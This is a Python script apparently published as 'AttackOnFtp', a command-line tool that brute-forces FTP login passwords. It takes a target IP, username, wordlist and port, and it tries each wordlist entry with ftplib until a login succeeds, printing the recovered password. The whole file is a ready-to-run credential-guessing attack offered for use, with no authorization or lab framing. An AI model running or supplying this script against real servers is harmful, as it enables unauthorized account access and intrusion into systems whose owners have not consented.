import argparse
import socket
import ftplib
import sys
from datetime import datetime

version = 1.0

def banner():
    print(f"""
\033[31m    |       .     .                   '||     \033[m  ..|''||            \033[32m'||''''|   .            \033[m
\033[31m   |||    .||.  .||.   ....     ....   ||  .. \033[m .|'    ||  .. ...   \033[32m ||  .   .||.  ... ...  \033[m
\033[31m  |  ||    ||    ||   '' .||  .|   ''  || .'  \033[m ||      ||  ||  ||  \033[32m ||''|    ||    ||'  || \033[m
\033[31m .''''|.   ||    ||   .|' ||  ||       ||'|.  \033[m '|.     ||  ||  ||  \033[32m ||       ||    ||    | \033[m
\033[31m.|.  .||.  '|.'  '|.' '|..'|'  '|...' .||. ||.\033[m  ''|...|'  .||. ||. \033[32m.||.      '|.'  ||...'  
                                                                                   ||\033[m V {version}
                         create by ~ github.com/Miguel-Galdin0                    \033[32m''''\033[m
""")

banner()

#Arguments
parser = argparse.ArgumentParser(description="AttackOnFtp is a password brute force tool for ftp made with python!")
parser.add_argument("ip", help="IP to make brute force.")
parser.add_argument("-u","--user","--username", help="The user of ftp service.", required=True)
parser.add_argument("-w","--wordlist", help="The document used to try passwords.", required=True)
parser.add_argument("-p","--port", help="Make brute force in specific port. Default port is 21.")
args = parser.parse_args()

ip = args.ip
user = args.user
pass_found = False


#TREATING INPUT OF PORTS
try:
    if args.port:
        port = args.port
        port = int(port)
        if port > 65536:
            print("\n\033[31m[-]\033[m Ports must be between 1 and 65536!")
            sys.exit()
    else:
        port = 21

except ValueError:
    print(f"\n\033[31m[-]\033[m {port} is not a valid port!")
    sys.exit()

except TypeError:
            print("\n\033[31m[-]\033[m The ports need to be an integer number!")
            sys.exit()

#DATA TIME
print('-' * 50)
print('|[*] Brute force Target: ' + ip)
print('|[*] Brute force started at: ' + str(datetime.now()))
print('-' * 50)

#OPEN WORLIST
try:
    file = open(args.wordlist, "r")
except (FileNotFoundError, OSError):
    print("\n\033[31m[-]\033[m File not found!")
    sys.exit()

#READ LINES OF WORDLIST
for line in file.readlines():
        line = line.strip()
        print(f'\n\033[33m[!]\033[m Testing user "{user}" with password "{line}".')
        #STARTING THE BRUTE FORCE
        try:
            ftp = ftplib.FTP(ip)
            ftp.connect(host=ip, port=port)
            ftp.login(user=user,passwd=line)
            print("\n\033[32m[+]\033[m------>>>Password found!<<<------")
            pass_found = True
            print(f'\033[32m[+]\033[m Password is: {line}')
            ftp.quit() 
            break

        except socket.gaierror:
            print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
            print("\033[31m[-]\033[m The IP seems down or doesn't exist.")
            sys.exit()

        except socket.error:
            print(f'\n\033[31m[-]\033[m Failed to connect in: {ip}')
            print('\n\033[31m[-]\033[m Server is not responding!')
            sys.exit()

        except ftplib.error_perm:
            print(f'\033[31m[-]\033[m Invalid password!')
            pass

        except ConnectionRefusedError:
            print(f'\n\033[31m[-]\033[m Server is not responding!')
            sys.exit()

        except EOFError:
            print(f'\n\033[31m[-]\033[m Server stop stopped responding!')
            sys.exit()

        except KeyboardInterrupt:
            print('\n\033[31m[-]\033[m Exiting program!')
            sys.exit()

if pass_found != True:
            print(f'\n\033[31m[-]\033[m Password not found for user {user}!')
